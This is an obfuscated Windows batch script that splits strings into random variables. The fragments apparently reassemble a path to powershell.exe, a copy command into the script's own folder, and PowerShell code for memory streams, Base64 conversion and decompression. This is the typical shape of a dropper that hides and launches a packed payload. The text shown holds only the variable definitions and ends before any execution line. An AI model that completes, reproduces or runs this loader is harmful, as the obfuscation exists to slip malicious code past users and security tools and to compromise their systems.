@echo off
set "twVMyYYeNd=rs"
set "NDQMsQwLrv=rS"
set "HFegkvEWwZ=\W"
set "zDnbgvhzZC=nd"
set "dsRQfPxNlb=:\"
set "GNFgLBATpg=he"
set "DbEYcjtUMQ=Po"
set "MHCqkbqXdl=1."
set "okuwbNsBYo=in"
set "vxNQDlYccL=po"
set "HXOIReAQYM=st"
set "dTwJQaqBQI=0\"
set "YdHlvAeQJK=Sy"
set "GyNJeFgEVS=ws"
set "OWdOMDMMQr=we"
set "uOqNDhxcdp=32"
set "EriHSYFGSV= C"
set "nUoYcGGpme=xe"
set "ANnpVKuZXB=ll"
set "JJbYQpULNY=he"
set "YzjgRfBDRd= /"
set "sFOPnpmeJR=y "
set "qHndtSlWeT=we"
set "coVrVvGtpY=ll"
set "jOpOyGaBYG=Wi"
set "PtwWoZBbrE=.e"
set "MqgRAPLgtT=co"
set "klLgnhXaXr=em"
set "fnEWIQfQpm=py"
set "tsFndPbtil=s\"
set "SuODeZkSGm=\v"
set "CeSsqTHafK=do"
set "kfoyPMvOQS=ow"
set "JHakjBJNHy= %~dp0"
set "LLTTliWweS=cd"
set "YyBpyTDPVP=w.En"
set "GjFFctnPFT=Bmor"
set "zeYOGCEVtY=oA.T"
set "yZEzoroFEf=).Sp"
set "BkaDnkdWOr=($as"
set "BDdpOGAted=nage"
set "dXRUOUIdEI=ew-O"
set "katPvRQHOG=t Sy"
set "XLTsZmHVKL=uLCg"
set "xSByVTEERx=Comp"
set "jLfYNlcGmr=);$V"
set "daoXULTIIX=y.Cr"
set "hUvRLTOzsW=ddin"
set "UVBSAaOnmm=oint"
set "XuQVYbbamk=New-"
set "ZTuZYWNcbq=$fEF"
set "coUXuflhTW=onve"
set "gmyjUuokSz=esFX"
set "iABikXGEus=TExH"
set "MeivcGeDVv=3HWs"
set "IEbUDSthCJ=mory"
set "vOVbQjrCNK=m(, "
set "zycEQMiHLk=nirt"
set "gdFgYVBTRQ=();$"
set "KefrOjlECp=BC;$"
set "wcctoEwIvJ=.-16"
set "UrEZELRzJd= New"
set "GqHhgsRHPn=aQlL"
set "ZPsMIPbGVK=::De"
set "iguHKVCFkK=();$"
set "nztUcMmKaT=pres"
set "tZKjiwIAqB=esMa"
set "YohEyvgtCA=F'[-"
